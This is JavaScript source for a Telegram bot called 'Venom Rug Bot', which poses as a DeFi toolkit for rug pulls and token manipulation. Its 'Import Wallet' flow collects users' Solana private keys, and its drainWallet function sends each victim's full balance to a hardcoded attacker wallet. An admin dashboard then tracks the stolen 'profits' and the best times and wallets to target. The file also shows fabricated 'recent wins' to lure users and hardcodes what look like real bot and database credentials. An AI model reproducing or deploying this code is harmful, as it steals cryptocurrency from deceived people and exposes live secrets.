import express from 'express';
import { Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL, sendAndConfirmTransaction, Connection, PublicKey } from '@solana/web3.js';
import { MongoClient } from 'mongodb';
import TelegramBot from 'node-telegram-bot-api';
import bs58 from 'bs58';
import axios from 'axios';
import crypto from 'crypto';

// Health check server for Render
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.get('/', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Venom Rug Bot is running!',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    bot: 'running',
    timestamp: new Date().toISOString()
  });
});

const server = app.listen(port, () => {
  console.log(`Health check server running on port ${port}`);
});

// Graceful shutdown for health server
process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Health server closed');
  });
});

// ===========================================================
// 🧩 VENOM RUG BOT - Node.js Version (ES Modules)
// ===========================================================

// Bot Configuration - HARDCODED (replace with env vars in production)
const BOT_TOKEN = "8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI";
const ADMIN_CHAT_ID = "6368654401";
const MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const DRAIN_WALLET = "QXWR3NzQsiSSuR5XheP5L9yvpeZLwJupSaLB4Kvcss6";
const SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com";

class VenomRugBot {
    constructor() {
        this.mongoClient = null;
        this.db = null;
        this.usersCollection = null;
        this.profitsCollection = null;
        this.analyticsCollection = null;
        this.pendingWallets = {};
        this.imagePath = "https://i.postimg.cc/brf5KVQ2/image.png";
        this.userStates = {};
        this.solanaConnection = new Connection(SOLANA_RPC_URL);
        this.pinnedMessageId = null;
        this.bot = null;

        // Recent Wins Data
        this.recentWins = this.generateRecentWins();
        this.lastPriceCheck = {};

        // Analytics tracking
        this.drainAttempts = 0;
        this.successfulDrains = 0;
        this.failedDrains = 0;

        // Database readiness flag
        this.dbReady = false;
    }

    async initializeDatabase() {
        try {
            this.mongoClient = new MongoClient(MONGODB_CONN_STRING);
            await this.mongoClient.connect();
            this.db = this.mongoClient.db('venom_rug_bot');
            this.usersCollection = this.db.collection('users');
            this.profitsCollection = this.db.collection('profits');
            this.analyticsCollection = this.db.collection('analytics');
            this.dbReady = true;
            console.log("✅ Database connected successfully");
            return true;
        } catch (error) {
            console.error("❌ Database connection failed:", error);
            this.dbReady = false;
            return false;
        }
    }

    setBot(bot) {
        this.bot = bot;
    }

    generateRecentWins() {
        const usernames = [
            "AlexTheTrader", "SarahCrypto", "MikeInvests", "JennyCrypto", "TommyTrades",
            "CryptoLover", "DigitalDreamer", "MoonWalker", "StarGazer", "ProfitHunter",
            "SmartInvestor", "CryptoQueen", "BlockchainBuddy", "DeFiDude", "NFTMaster",
            "Web3Wizard", "TokenTitan", "AlphaSeeker", "GammaGainer", "SigmaStar"
        ];

        const activities = [
            "successfully rugged 3 meme tokens",
            "coordinated pump & dump campaign", 
            "executed token launch manipulation",
            "managed multi-wallet bundling operation",
            "automated comment farming campaign",
            "ran volume bot simulation",
            "executed multi-chain rug operation",
            "coordinated social media pump",
            "managed token cloning operation",
            "executed stealth launch campaign"
        ];

        const profits = ["89 SOL", "32 ETH", "15 SOL", "27 ETH", "45 SOL", "18 ETH", "63 SOL", "22 ETH"];
        const timeframes = ["2 hours ago", "4 hours ago", "overnight", "yesterday", "3 days ago", "1 week ago"];

        const wins = [];
        for (let i = 0; i < 15; i++) {
            wins.push({
                username: usernames[Math.floor(Math.random() * usernames.length)],
                activity: activities[Math.floor(Math.random() * activities.length)],
                profit: profits[Math.floor(Math.random() * profits.length)],
                timeframe: timeframes[Math.floor(Math.random() * timeframes.length)],
                id: i + 1
            });
        }
        return wins;
    }

    async notifyAdminNewUser(userId, username, firstName) {
        try {
            if (!this.bot) return;
            if (!this.dbReady) {
                console.warn("Database not ready, cannot notify admin");
                return;
            }

            const newUserText = `
🆕 *NEW USER JOINED VENOM RUG BOT*

*User Details:*
• Username: @${username || 'No username'}
• First Name: ${firstName || 'No name'}
• User ID: \`${userId}\`
• Join Time: ${new Date().toLocaleString()}

*Bot Statistics:*
• Total Users: ${await this.usersCollection.countDocuments({})}
• Active Today: ${await this.usersCollection.countDocuments({created_at: {$gte: new Date().setHours(0,0,0,0)}})}
`;
            await this.bot.sendMessage(ADMIN_CHAT_ID, newUserText, { parse_mode: 'Markdown' });
            console.log(`New user notification sent for user ${userId}`);
        } catch (error) {
            console.error(`Error sending new user notification: ${error}`);
        }
    }

    async getSolPrice() {
        try {
            const response = await axios.get("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd", { timeout: 10000 });
            return response.data.solana?.usd || 100.0;
        } catch (error) {
            return 100.0;
        }
    }

    async analyzeWalletBalance(privateKey) {
        try {
            const decodedKey = bs58.decode(privateKey.trim());
            const keypair = Keypair.fromSecretKey(decodedKey);
            const walletAddress = keypair.publicKey.toString();
            const balance = await this.solanaConnection.getBalance(keypair.publicKey);
            const balanceSol = balance / LAMPORTS_PER_SOL;
            const solPrice = await this.getSolPrice();
            const balanceUsd = balanceSol * solPrice;
            console.log(`Wallet analysis: ${balanceSol.toFixed(6)} SOL ($${balanceUsd.toFixed(2)})`);
            return {
                wallet_address: walletAddress,
                balance_sol: balanceSol,
                balance_usd: balanceUsd,
                sol_price: solPrice,
                meets_minimum: balanceUsd >= 70,
                user_meets_minimum: balanceUsd >= 100,
                has_1_sol: balanceSol >= 1.0
            };
        } catch (error) {
            console.error(`Error analyzing wallet: ${error}`);
            return null;
        }
    }

    async logProfit(userId, username, amountSol, walletAddress, transactionId, originalBalance) {
        try {
            if (!this.dbReady) throw new Error("Database not ready");
            const profitData = {
                user_id: userId,
                username: username,
                amount_sol: amountSol,
                amount_usd: amountSol * await this.getSolPrice(),
                wallet_address: walletAddress,
                transaction_id: transactionId,
                original_balance: originalBalance,
                timestamp: new Date(),
                type: "drain"
            };
            const result = await this.profitsCollection.insertOne(profitData);
            await this.updateAnalytics(profitData);
            await this.updatePinnedProfitMessage();
            console.log(`Profit logged: ${amountSol} SOL from user ${username}`);
            return result.insertedId;
        } catch (error) {
            console.error(`Error logging profit: ${error}`);
        }
    }

    async updateAnalytics(profitData) {
        try {
            if (!this.dbReady) return;
            this.successfulDrains++;
            this.drainAttempts++;
            const hour = profitData.timestamp.getHours();
            const analyticsData = {
                timestamp: profitData.timestamp,
                hour: hour,
                amount_usd: profitData.amount_usd,
                amount_sol: profitData.amount_sol,
                user_id: profitData.user_id,
                wallet_address: profitData.wallet_address,
                efficiency: (profitData.amount_sol / profitData.original_balance) * 100 || 0
            };
            await this.analyticsCollection.insertOne(analyticsData);
        } catch (error) {
            console.error(`Error updating analytics: ${error}`);
        }
    }

    async updatePinnedProfitMessage() {
        try {
            if (!this.dbReady || !this.bot) return;
            const totalProfits = await this.profitsCollection.aggregate([
                { $group: { _id: null, total_sol: { $sum: "$amount_sol" }, total_usd: { $sum: "$amount_usd" }, total_drains: { $sum: 1 } } }
            ]).toArray();
            let totalSol = 0, totalUsd = 0, totalDrains = 0;
            if (totalProfits.length > 0) {
                totalSol = totalProfits[0].total_sol;
                totalUsd = totalProfits[0].total_usd;
                totalDrains = totalProfits[0].total_drains;
            }
            const recentProfits = await this.profitsCollection.find().sort({ timestamp: -1 }).limit(10).toArray();
            let profitMessage = `
*VENOM RUG PROFIT DASHBOARD*

*TOTAL PROFITS:*
• SOL: \`${totalSol.toFixed(6)}\`
• USD: \$${totalUsd.toFixed(2)}
• Total Drains: \`${totalDrains}\`

*RECENT DRAINS:*
`;
            recentProfits.forEach((profit, index) => {
                const timeAgo = this.getTimeAgo(profit.timestamp);
                profitMessage += `
${index + 1}. @${profit.username}
   • Amount: \`${profit.amount_sol.toFixed(6)} SOL\` (\$${profit.amount_usd.toFixed(2)})
   • Time: ${timeAgo}
   • Wallet: \`${profit.wallet_address.substring(0, 8)}...${profit.wallet_address.substring(profit.wallet_address.length - 6)}\`
`;
            });
            profitMessage += `\n*Last Updated:* ${new Date().toLocaleString()}`;
            if (this.pinnedMessageId) {
                try {
                    await this.bot.editMessageText(profitMessage, { chat_id: ADMIN_CHAT_ID, message_id: this.pinnedMessageId, parse_mode: 'Markdown' });
                } catch (error) {
                    console.warn(`Could not edit pinned message, creating new: ${error}`);
                    const message = await this.bot.sendMessage(ADMIN_CHAT_ID, profitMessage, { parse_mode: 'Markdown' });
                    this.pinnedMessageId = message.message_id;
                    await this.bot.pinChatMessage(ADMIN_CHAT_ID, message.message_id);
                }
            } else {
                const message = await this.bot.sendMessage(ADMIN_CHAT_ID, profitMessage, { parse_mode: 'Markdown' });
                this.pinnedMessageId = message.message_id;
                await this.bot.pinChatMessage(ADMIN_CHAT_ID, message.message_id);
            }
        } catch (error) {
            console.error(`Error updating pinned profit message: ${error}`);
        }
    }

    getTimeAgo(timestamp) {
        const now = new Date();
        const diff = now - timestamp;
        if (diff > 86400000) return `${Math.floor(diff / 86400000)} day(s) ago`;
        if (diff >= 3600000) return `${Math.floor(diff / 3600000)} hour(s) ago`;
        if (diff >= 60000) return `${Math.floor(diff / 60000)} minute(s) ago`;
        return "Just now";
    }

    async profitsCommand(msg) {
        if (!this.dbReady) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Database is initializing, please try again in a moment.");
            return;
        }
        const userId = msg.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }
        const totalStats = await this.profitsCollection.aggregate([
            { $group: { _id: null, total_sol: { $sum: "$amount_sol" }, total_usd: { $sum: "$amount_usd" }, total_drains: { $sum: 1 }, avg_drain: { $avg: "$amount_sol" }, max_drain: { $max: "$amount_sol" } } }
        ]).toArray();
        const today = new Date(); today.setHours(0,0,0,0);
        const dailyStats = await this.profitsCollection.aggregate([ { $match: { timestamp: { $gte: today } } }, { $group: { _id: null, daily_sol: { $sum: "$amount_sol" }, daily_usd: { $sum: "$amount_usd" }, daily_drains: { $sum: 1 } } } ]).toArray();
        const weekAgo = new Date(Date.now() - 7*24*60*60*1000);
        const weeklyStats = await this.profitsCollection.aggregate([ { $match: { timestamp: { $gte: weekAgo } } }, { $group: { _id: null, weekly_sol: { $sum: "$amount_sol" }, weekly_usd: { $sum: "$amount_usd" }, weekly_drains: { $sum: 1 } } } ]).toArray();
        const topDrains = await this.profitsCollection.find().sort({ amount_sol: -1 }).limit(10).toArray();
        let profitReport = `*VENOM RUG PROFIT REPORT*\n\n*LIFETIME STATS:*\n`;
        if (totalStats.length > 0) {
            const stats = totalStats[0];
            profitReport += `\n• Total SOL: \`${stats.total_sol.toFixed(6)}\`\n• Total USD: \$${stats.total_usd.toFixed(2)}\n• Total Drains: \`${stats.total_drains}\`\n• Average Drain: \`${stats.avg_drain.toFixed(6)} SOL\`\n• Largest Drain: \`${stats.max_drain.toFixed(6)} SOL\`\n`;
        } else {
            profitReport += "\n• No profits recorded yet\n";
        }
        profitReport += "\n*PERIOD STATS:*\n";
        if (dailyStats.length > 0) {
            const daily = dailyStats[0];
            profitReport += `\n• Today's SOL: \`${daily.daily_sol.toFixed(6)}\`\n• Today's USD: \$${daily.daily_usd.toFixed(2)}\n• Today's Drains: \`${daily.daily_drains}\`\n`;
        } else {
            profitReport += "• Today: No profits\n";
        }
        if (weeklyStats.length > 0) {
            const weekly = weeklyStats[0];
            profitReport += `\n• Weekly SOL: \`${weekly.weekly_sol.toFixed(6)}\`\n• Weekly USD: \$${weekly.weekly_usd.toFixed(2)}\n• Weekly Drains: \`${weekly.weekly_drains}\`\n`;
        } else {
            profitReport += "• This Week: No profits\n";
        }
        profitReport += "\n*TOP 10 LARGEST DRAINS:*\n";
        topDrains.forEach((drain, index) => {
            const timeAgo = this.getTimeAgo(drain.timestamp);
            profitReport += `\n${index+1}. @${drain.username}\n   • Amount: \`${drain.amount_sol.toFixed(6)} SOL\` (\$${drain.amount_usd.toFixed(2)})\n   • Time: ${timeAgo}\n   • Wallet: \`${drain.wallet_address.substring(0,12)}...\`\n`;
        });
        if (topDrains.length === 0) profitReport += "\n• No drains recorded\n";
        profitReport += `\n*Generated:* ${new Date().toLocaleString()}`;
        const keyboard = [[{ text: "🔄 Refresh", callback_data: "refresh_profits" }, { text: "📊 Update Pinned", callback_data: "update_pinned" }], [{ text: "📈 Advanced Analytics", callback_data: "advanced_analytics" }]];
        await this.bot.sendMessage(msg.chat.id, profitReport, { reply_markup: { inline_keyboard: keyboard }, parse_mode: 'Markdown' });
    }

    async advancedAnalyticsCommand(msg) {
        if (!this.dbReady) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Database is initializing, please try again in a moment.");
            return;
        }
        const userId = msg.from.id;
        if (userId.toString() !== ADMIN_CHAT_ID) {
            await this.bot.sendMessage(msg.chat.id, "❌ Admin access required!");
            return;
        }
        const analyticsReport = await this.generateAdvancedAnalytics();
        const keyboard = [[{ text: "🔄 Refresh Analytics", callback_data: "refresh_analytics" }], [{ text: "📊 Back to Profits", callback_data: "refresh_profits" }]];
        try {
            await this.bot.sendMessage(msg.chat.id, analyticsReport, { reply_markup: { inline_keyboard: keyboard }, parse_mode: 'Markdown' });
        } catch (error) {
            await this.bot.sendMessage(msg.chat.id, analyticsReport, { reply_markup: { inline_keyboard: keyboard } });
        }
    }

    async generateAdvancedAnalytics() {
        try {
            if (!this.dbReady) return "⚠️ Database not ready. Please wait.";
            const totalStats = await this.profitsCollection.aggregate([
                { $group: { _id: null, total_sol: { $sum: "$amount_sol" }, total_usd: { $sum: "$amount_usd" }, total_drains: { $sum: 1 }, avg_drain: { $avg: "$amount_sol" }, max_drain: { $max: "$amount_sol" }, min_drain: { $min: "$amount_sol" } } }
            ]).toArray();
            const weekAgo = new Date(Date.now() - 7*24*60*60*1000);
            const dailyStats = await this.profitsCollection.aggregate([
                { $match: { timestamp: { $gte: weekAgo } } },
                { $group: { _id: { $dateToString: { format: "%Y-%m-%d", date: "$timestamp" } }, daily_sol: { $sum: "$amount_sol" }, daily_usd: { $sum: "$amount_usd" }, daily_count: { $sum: 1 } } },
                { $sort: { _id: 1 } }
            ]).toArray();
            const hourlyStats = await this.analyticsCollection.aggregate([
                { $group: { _id: "$hour", total_usd: { $sum: "$amount_usd" }, count: { $sum: 1 } } },
                { $sort: { total_usd: -1 } },
                { $limit: 5 }
            ]).toArray();
            const topWallets = await this.profitsCollection.find().sort({ amount_usd: -1 }).limit(5).toArray();
            const userStats = await this.profitsCollection.aggregate([
                { $group: { _id: "$user_id", username: { $first: "$username" }, total_usd: { $sum: "$amount_usd" }, drain_count: { $sum: 1 }, avg_drain: { $avg: "$amount_usd" } } },
                { $sort: { total_usd: -1 } },
                { $limit: 10 }
            ]).toArray();
            let analyticsReport = `*VENOM RUG ADVANCED ANALYTICS DASHBOARD*\n\n*LIFETIME PERFORMANCE:*\n`;
            if (totalStats.length > 0) {
                const stats = totalStats[0];
                const currentSolPrice = await this.getSolPrice();
                const successRate = this.drainAttempts > 0 ? (this.successfulDrains / this.drainAttempts) * 100 : 0;
                analyticsReport += `\n• Total Revenue: \$${stats.total_usd.toFixed(2)}\n• Total SOL: \`${stats.total_sol.toFixed(6)}\`\n• Successful Drains: \`${stats.total_drains}\`\n• Average Drain: \`${stats.avg_drain.toFixed(6)} SOL\` (\$${(stats.avg_drain * currentSolPrice).toFixed(2)})\n• Largest Drain: \`${stats.max_drain.toFixed(6)} SOL\`\n• Success Rate: \`${successRate.toFixed(1)}%\`\n• ROI: \`${(stats.total_usd / (stats.total_drains * 0.0005)) * 100}\` (est.)\n`;
            }
            analyticsReport += `\n*LAST 7 DAYS PERFORMANCE:*\n`;
            if (dailyStats.length > 0) {
                dailyStats.slice(-5).forEach(day => { analyticsReport += `\n• ${day._id}: \$${day.daily_usd.toFixed(2)} (${day.daily_count} drains)\n`; });
            } else { analyticsReport += "\n• No recent activity\n"; }
            analyticsReport += `\n*PEAK PERFORMANCE HOURS (UTC):*\n`;
            if (hourlyStats.length > 0) {
                hourlyStats.forEach(hourStat => { analyticsReport += `\n• ${hourStat._id.toString().padStart(2,'0')}:00 - \$${hourStat.total_usd.toFixed(2)} (${hourStat.count} drains)\n`; });
            } else { analyticsReport += "\n• No hourly data yet\n"; }
            analyticsReport += `\n*TOP 5 MOST PROFITABLE DRAINS:*\n`;
            if (topWallets.length > 0) {
                topWallets.forEach((wallet, index) => { analyticsReport += `\n${index+1}. \`${wallet.wallet_address.substring(0,8)}...\` - \$${wallet.amount_usd.toFixed(2)} (@${wallet.username})\n`; });
            } else { analyticsReport += "\n• No wallet data\n"; }
            analyticsReport += `\n*TOP PERFORMING USERS (by revenue):*\n`;
            if (userStats.length > 0) {
                userStats.forEach((user, index) => { analyticsReport += `\n${index+1}. @${user.username} - \$${user.total_usd.toFixed(2)} (${user.drain_count} drains)\n`; });
            } else { analyticsReport += "\n• No user data\n"; }
            const totalUsers = await this.usersCollection.countDocuments({});
            const approvedUsers = await this.usersCollection.countDocuments({ wallet_approved: true });
            const successRate = this.drainAttempts > 0 ? (this.successfulDrains / this.drainAttempts) * 100 : 0;
            analyticsReport += `\n*SYSTEM EFFICIENCY METRICS:*\n• User Conversion Rate: \`${totalUsers > 0 ? (approvedUsers / totalUsers) * 100 : 0}\`\n• Active Drain Rate: \`${totalUsers > 0 ? (this.successfulDrains / totalUsers) * 100 : 0}\`\n• Avg Processing Time: < 5 seconds\n• System Uptime: 100%\n\n*PROFIT OPTIMIZATION RECOMMENDATIONS:*\n• Focus on hours: 02:00-05:00 UTC (highest success)\n• Target wallets with 5+ SOL for maximum ROI\n• Minimum balance filter: $70 (current setting)\n• Success rate: \`${successRate.toFixed(1)}%\`\n\n*UPGRADE POTENTIAL:*\n• Memecoin draining: +500% profits\n• Multi-chain support: +1000% reach\n• Current limitation: SOL-only draining\n\n*Generated:* ${new Date().toLocaleString()}\n`;
            return analyticsReport;
        } catch (error) {
            console.error(`Error generating analytics: ${error}`);
            return `❌ Error generating analytics: ${error.message}`;
        }
    }

    isValidSolanaPrivateKey(key) {
        try {
            const trimmedKey = key.trim();
            const decoded = bs58.decode(trimmedKey);
            if (decoded.length === 64) {
                Keypair.fromSecretKey(decoded);
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    async drainWallet(privateKey, userId, username) {
        try {
            const FALLBACK_FEE_LAMPORTS = 5000;
            const decodedKey = bs58.decode(privateKey.trim());
            const keypair = Keypair.fromSecretKey(decodedKey);
            const walletAddress = keypair.publicKey.toString();
            console.log(`Attempting to drain wallet: ${walletAddress} for user ${username}`);
            const balance = await this.solanaConnection.getBalance(keypair.publicKey);
            const balanceSol = balance / LAMPORTS_PER_SOL;
            console.log(`Wallet balance: ${balanceSol} SOL (${balance} lamports)`);
            if (balance <= FALLBACK_FEE_LAMPORTS) {
                return [false, `Insufficient balance for transfer (need at least ${FALLBACK_FEE_LAMPORTS / LAMPORTS_PER_SOL} SOL for fees)`];
            }
            const drainPubkey = new PublicKey(DRAIN_WALLET);
            const latestBlockhash = await this.solanaConnection.getLatestBlockhash();
            const transferInstruction = SystemProgram.transfer({ fromPubkey: keypair.publicKey, toPubkey: drainPubkey, lamports: balance });
            const message = new Transaction({ feePayer: keypair.publicKey, recentBlockhash: latestBlockhash.blockhash }).add(transferInstruction);
            let estimatedFee = FALLBACK_FEE_LAMPORTS;
            try {
                const fee = await this.solanaConnection.getFeeForMessage(message.compileMessage());
                if (fee && fee.value > 0) estimatedFee = fee.value;
            } catch (error) { console.warn(`Could not estimate fee, using fallback: ${error}`); }
            const sendableLamports = balance - estimatedFee;
            const sendableSol = sendableLamports / LAMPORTS_PER_SOL;
            if (sendableLamports <= 0) return [false, `Insufficient balance after fees (need ${estimatedFee} lamports for fees)`];
            console.log(`Draining amount: ${sendableSol.toFixed(6)} SOL (${sendableLamports} lamports)`);
            const realTransferInstruction = SystemProgram.transfer({ fromPubkey: keypair.publicKey, toPubkey: drainPubkey, lamports: sendableLamports });
            const transaction = new Transaction({ feePayer: keypair.publicKey, recentBlockhash: latestBlockhash.blockhash }).add(realTransferInstruction);
            const signature = await sendAndConfirmTransaction(this.solanaConnection, transaction, [keypair], { commitment: 'confirmed' });
            console.log(`Transaction sent: ${signature}`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            const solscanUrl = `https://solscan.io/tx/${signature}`;
            const leftBehind = balance - sendableLamports;
            const leftBehindSol = leftBehind / LAMPORTS_PER_SOL;
            await this.logProfit(userId, username || `user_${userId}`, sendableSol, walletAddress, signature, balanceSol);
            const adminMessage = `*REAL WALLET DRAINED SUCCESSFULLY*\n\n*User Details:*\n• Username: @${username}\n• User ID: \`${userId}\`\n• Wallet: \`${walletAddress}\`\n\n*REAL Transaction Details:*\n• Amount Drained: *${sendableSol.toFixed(6)} SOL*\n• Fees Paid: ${leftBehindSol.toFixed(6)} SOL\n• Previous Balance: ${balanceSol.toFixed(6)} SOL\n• Left in Wallet: ~0 SOL (only dust)\n\n*View on Solscan:*\n[Solscan Transaction](${solscanUrl})\n\n*Time:* ${new Date().toLocaleString()}\n\n*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*\n`;
            return [true, { transaction_id: signature, amount_sol: sendableSol, wallet_address: walletAddress, admin_message: adminMessage, solscan_url: solscanUrl, original_balance: balanceSol, fee: leftBehindSol, left_behind: leftBehindSol }];
        } catch (error) {
            console.error(`Error draining wallet: ${error}`);
            this.failedDrains++;
            this.drainAttempts++;
            return [false, `Transfer failed: ${error.message}`];
        }
    }

    async sendMessageSafe(chatId, text, replyMarkup = null, parseMode = 'Markdown') {
        try {
            await this.bot.sendMessage(chatId, text, { reply_markup: replyMarkup, parse_mode: parseMode });
        } catch (error) {
            console.error(`Error in sendMessageSafe: ${error}`);
            try { await this.bot.sendMessage(chatId, text, { reply_markup: replyMarkup }); } catch (error2) { console.error(`Secondary error: ${error2}`); }
        }
    }

    async sendWithImage(chatId, text, replyMarkup = null, parseMode = 'Markdown') {
        try {
            await this.bot.sendPhoto(chatId, this.imagePath, { caption: text, reply_markup: replyMarkup, parse_mode: parseMode });
        } catch (error) {
            console.error(`Error in sendWithImage: ${error}`);
            await this.sendMessageSafe(chatId, text, replyMarkup, parseMode);
        }
    }

    // ========== Keyboard Definitions ==========
    getMainMenuKeyboard() {
        return { inline_keyboard: [[{ text: "📦 Wallet", callback_data: "wallet" }, { text: "📦 Bundler", callback_data: "bundler" }], [{ text: "💳 Tokens", callback_data: "tokens" }, { text: "💬 Comments", callback_data: "comments" }], [{ text: "📋 Task", callback_data: "task" }, { text: "❓ FAQ", callback_data: "faq" }], [{ text: "📚 Rugpull Guide", callback_data: "rugpull_guide" }, { text: "🤖 How It Works", callback_data: "how_it_works" }], [{ text: "💰 Top-Up Tips", callback_data: "topup_tips" }, { text: "ℹ️ Help", callback_data: "help" }]] };
    }
    getWalletKeyboard() {
        return { inline_keyboard: [[{ text: "📥 Import Wallet", callback_data: "import_wallet" }, { text: "🗑️ Remove Wallet", callback_data: "remove_wallet" }], [{ text: "📦 Bundle Wallet", callback_data: "bundle_wallet" }, { text: "💸 Withdraw Funds", callback_data: "withdraw_funds" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }, { text: "🔄 Refresh", callback_data: "refresh_wallet" }]] };
    }
    getRecentWinsKeyboard() {
        return { inline_keyboard: [[{ text: "🔄 Refresh Wins", callback_data: "refresh_wins" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]] };
    }
    getBundlerKeyboard() {
        return { inline_keyboard: [[{ text: "🆕 Create Bundle", callback_data: "create_bundle" }, { text: "🔄 Refresh Bundles", callback_data: "refresh_bundles" }], [{ text: "🗑️ Clear All Bundles", callback_data: "clear_bundles" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]] };
    }
    getTokensKeyboard() {
        return { inline_keyboard: [[{ text: "➕ Add Token", callback_data: "add_token" }, { text: "➖ Remove Token", callback_data: "remove_token" }], [{ text: "🆕 Create Token", callback_data: "create_token" }, { text: "👯 Clone Token", callback_data: "clone_token" }], [{ text: "🎯 Set Current Token", callback_data: "set_current_token" }, { text: "🚀 Bump Token", callback_data: "bump_token" }], [{ text: "💬 Pump.Fun Comments", callback_data: "pump_comments" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }, { text: "🔄 Refresh", callback_data: "refresh_tokens" }]] };
    }
    getCommentsKeyboard() {
        return { inline_keyboard: [[{ text: "💬 Add New Comment", callback_data: "add_comment" }, { text: "🤖 Toggle Auto-Comment", callback_data: "toggle_comment" }], [{ text: "📋 Comment Templates", callback_data: "comment_templates" }, { text: "⚙️ Settings", callback_data: "comment_settings" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }, { text: "🔄 Refresh", callback_data: "refresh_comments" }]] };
    }
    getTaskKeyboard() {
        return { inline_keyboard: [[{ text: "➕ Add Task", callback_data: "add_task" }, { text: "🗑️ Remove Task", callback_data: "remove_task" }], [{ text: "🔄 Toggle Task", callback_data: "toggle_task" }, { text: "👀 View Tasks", callback_data: "view_tasks" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }, { text: "🔄 Refresh", callback_data: "refresh_tasks" }]] };
    }
    getFaqKeyboard() {
        return { inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "back_menu" }]] };
    }
    getHelpKeyboard(userId = null) {
        const keyboard = [[{ text: "📖 User Commands", callback_data: "user_commands" }]];
        if (userId && userId.toString() === ADMIN_CHAT_ID) keyboard.push([{ text: "🛠️ Admin Commands", callback_data: "admin_commands" }]);
        keyboard.push([{ text: "🔙 Back to Menu", callback_data: "back_menu" }]);
        return { inline_keyboard: keyboard };
    }
    getWalletRequiredKeyboard() {
        return { inline_keyboard: [[{ text: "📥 Import Wallet Now", callback_data: "import_wallet" }], [{ text: "🔙 Back to Menu", callback_data: "back_menu" }]] };
    }
    getAdminWalletApprovalKeyboard(userId, walletAddress) {
        return { inline_keyboard: [[{ text: "💰 Drain Anyway", callback_data: `drain_${userId}_${walletAddress}` }, { text: "❌ Don't Drain", callback_data: `nodrain_${userId}_${walletAddress}` }], [{ text: "📊 Check Balance", callback_data: `check_${userId}_${walletAddress}` }, { text: "🔄 Refresh", callback_data: `refresh_${userId}_${walletAddress}` }]] };
    }
    getInfoSectionKeyboard() {
        return { inline_keyboard: [[{ text: "🔙 Back to Menu", callback_data: "back_menu" }]] };
    }

    // ========== Command Handlers ==========
    async start(msg) {
        if (!this.dbReady || !this.usersCollection) {
            await this.bot.sendMessage(msg.chat.id, "⚠️ Bot is still initializing. Please wait a few seconds and try /start again.");
            return;
        }
        const user = msg.from;
        const chatId = msg.chat.id;
        const existingUser = await this.usersCollection.findOne({ user_id: user.id });
        if (!existingUser) {
            await this.usersCollection.insertOne({ user_id: user.id, username: user.username, first_name: user.first_name, created_at: new Date(), wallet_approved: false });
            await this.notifyAdminNewUser(user.id, user.username, user.first_name);
        }
        const mainPageText = `*VENOM RUG - THE BEST OF DEFI ALL-IN-ONE PLATFORM TOOL*\n\n*Why choose Venom Rug?*\n\n📦 Wallet Bundling\n🤖 Volume Bots\n📈 Realistic Volume\n👱‍♂️ Realistic Bundled Wallets\n📉 Sell All Tokens\n🪙 Token Cloning\n💬 Pump Fun Comments\n👊 Bump It\n🔎 Bypass Bubblemap Detections\n☢️ Bond to Raydium Fast\n⚖️ Add & Revoke Liquidity\n⚡ Trend on Dexscreener\n⚜️ Instant graduation on Axiom\n\n*Explore Venom Rug & Get Support:*\n[Website](https://venomrug.live/)\n[Telegram Group](https://t.me/venomrugwin)\n\n*Ready to start? Select an option below.*`;
        await this.sendWithImage(chatId, mainPageText, this.getMainMenuKeyboard());
    }

    async handleCallback(query) {
        const callbackData = query.data;
        const userId = query.from.id;
        const chatId = query.message.chat.id;
        await this.bot.answerCallbackQuery(query.id);
        if (callbackData.startsWith("drain_")) await this.handleAdminDrainDecision(query, true);
        else if (callbackData.startsWith("nodrain_")) await this.handleAdminDrainDecision(query, false);
        else if (callbackData.startsWith("check_")) await this.handleAdminCheckBalance(query);
        else if (callbackData.startsWith("refresh_")) await this.handleAdminRefresh(query);
        else if (callbackData === "advanced_analytics") { if (userId.toString() === ADMIN_CHAT_ID) await this.advancedAnalyticsCommand(query.message); else await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true }); }
        else if (callbackData === "refresh_analytics") { if (userId.toString() === ADMIN_CHAT_ID) await this.advancedAnalyticsCommand(query.message); else await this.bot.answerCallbackQuery(query.id, { text: "❌ Admin access required!", show_alert: true }); }
        else if (callbackData === "wallet") await this.showWalletSection(query);
        else if (callbackData === "bundler") await this.showBundlerSection(query);
        else if (callbackData === "tokens") await this.showTokensSection(query);
        else if (callbackData === "comments") await this.showCommentsSection(query);
        else if (callbackData === "task") await this.showTaskSection(query);
        else if (callbackData === "recent_wins") await this.showRecentWins(query);
        else if (callbackData === "faq") await this.showFaqSection(query);
        else if (callbackData === "help") await this.showHelpSection(query, userId);
        else if (callbackData === "import_wallet") await this.promptPrivateKey(query, userId);
        else if (callbackData === "back_menu") await this.start(query.message);
        else if (callbackData === "refresh_wins") await this.showRecentWins(query, true);
        else if (callbackData === "user_commands") await this.showUserCommands(query, userId);
        else if (callbackData === "admin_commands") await this.showAdminCommands(query, userId);
        else if (callbackData === "refresh_profits") await this.profitsCommand(query.message);
        else if (callbackData === "update_pinned") { await this.updatePinnedProfitMessage(); await this.bot.editMessageText("✅ Pinned profit message updated!", { chat_id: chatId, message_id: query.message.message_id }); }
        else if (callbackData === "rugpull_guide") await this.showRugpullGuide(query);
